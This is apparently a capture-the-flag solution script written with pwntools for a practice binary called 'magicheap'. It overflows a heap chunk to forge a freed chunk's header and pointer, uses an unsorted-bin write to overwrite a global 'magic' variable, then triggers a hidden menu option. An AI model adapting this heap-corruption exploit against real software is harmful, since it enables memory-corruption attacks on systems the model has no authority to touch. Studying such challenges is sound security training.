from pwn import *

r=process('./magicheap')
elf=ELF('magicheap')

def createHeap(size,content):
	r.sendlineafter('Your choice :','1')
	r.sendlineafter('Size of Heap : ',str(size))
	r.sendlineafter('Content of heap:',content)
def editHeap(index,size,content):
	r.sendlineafter('Your choice :','2')
	r.sendlineafter('Index :',str(index))
	r.sendlineafter('Size of Heap : ',str(size))
	r.sendlineafter('Content of heap : ',content)
def deleteHeap(index):
	r.sendlineafter('Your choice :','3')
	r.sendlineafter('Index :',str(index))

magic = 0x6020a0 - 0x10

fakepadding = ''
fakepadding += 'X'*0x40
fakepadding += p64(0x0)
fakepadding += p64(0x91)
fakepadding += p64(0x0)
fakepadding += p64(magic)

createHeap(0x40,'aaaaaaaa')#0
createHeap(0x80,'bbbbbbbb')#1
createHeap(0x20,'cccccccc')#2
deleteHeap(1)
editHeap(0,0x60,fakepadding)
createHeap(0x80,'dddddddd')

r.sendlineafter('Your choice :','4869')
r.interactive()
